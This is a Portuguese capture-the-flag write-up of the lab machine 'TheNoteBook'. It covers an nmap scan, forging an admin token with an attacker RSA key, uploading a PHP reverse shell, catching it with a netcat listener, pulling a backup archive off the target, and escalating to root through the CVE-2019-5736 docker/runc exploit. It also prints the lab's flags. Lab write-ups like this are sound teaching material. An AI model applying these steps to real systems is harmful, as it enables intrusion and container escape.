# TheNoteBook

---

## Enum

---

- Descobrimento das portas abertas utilizando nmap:

```python
nmap -A 10.10.10.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 17:21 -03
Nmap scan report for 10.10.10.230
Host is up (0.14s latency).
Not shown: 896 closed ports, 102 filtered ports
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

---

## Exploration

---

- Ao ver a resposta do nmap de volta , teve o conhecimento da porta 80 aberta , por default tinha uma aplicação web rodando, então ao registrar a conta, o servidor deu um token junto com a conta criada , então apenas com uma modificação do token, a conta teria um privilégio de administrador.

    ![Untitled](https://user-images.githubusercontent.com/69881757/126536909-bfb6c7f7-bcff-4042-89d3-880eaa93aa68.png)


- Então criamos uma chave RSA com openssl para válidar nosso token.

```python
openssl genrsa -out privKey.key 2048
```

- Então com o reconhecimento da página , teve o conhecimento para fazer upload de arquivos,então subimos uma Reverse shell em php e a executamos:

    ![Untitled 1](https://user-images.githubusercontent.com/69881757/126536934-cace4634-eda4-4bfd-a3a8-24f1030862e8.png)


- Ao pegar shell , percebemos 
- um arquivo de backup chamado "home.tar.gz", então puxamos para nossa maquina:

```python
nc -lvnp PORT
```

```python
python3 -m http.server
```

```python
wget [http://10.10.10.230:8000/home.tar.gz](http://10.10.10.230:8000/home.tar.gz) 
```

```python
tar -xzvf home.tar.gz
```

- Trocando de user e tinha a primeira flag!

User flag: dfed2065e59b2d453d341d27e123c25e

---

## Pós-Exploration

---

```python
sudo -l
User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

- Então ao pesquisar esse privilege escalation no google , teve o reconhecimento da CVE-2019-5736 → [https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)
- Editamos a cve:

    ![bash](https://user-images.githubusercontent.com/69881757/126537014-3e26612d-ff72-4f36-a56c-520603dabd56.png)


- E fizemos a compilação:

    ![compilar](https://user-images.githubusercontent.com/69881757/126537046-dd2d5788-516e-48bb-9e16-d9b79fe0819f.png)


- Entramos na docker :

    ![docker](https://user-images.githubusercontent.com/69881757/126537073-bbe06e2c-c79e-4f97-a4e3-7105fddd06a2.png)


- Abrimos um servidor e subimos nosso binario "main":

    ![main](https://user-images.githubusercontent.com/69881757/126537106-d58ca738-bd1b-4674-8471-bec1f2d679d8.png)


- Ao executar o binario na docker, deixaremos uma porta ouvindo com o netcat e com o segundo terminal executamos a docker!

    ![sh](https://user-images.githubusercontent.com/69881757/126537133-c0144dba-081d-430f-a37f-5205019a1fc4.png)


- Root!

    ![root](https://user-images.githubusercontent.com/69881757/126537153-4e2349ef-7929-47eb-9aa2-1ca1b797c6b5.png)


Root Flag:584012a257e2e43dbf5d6cf66507af41
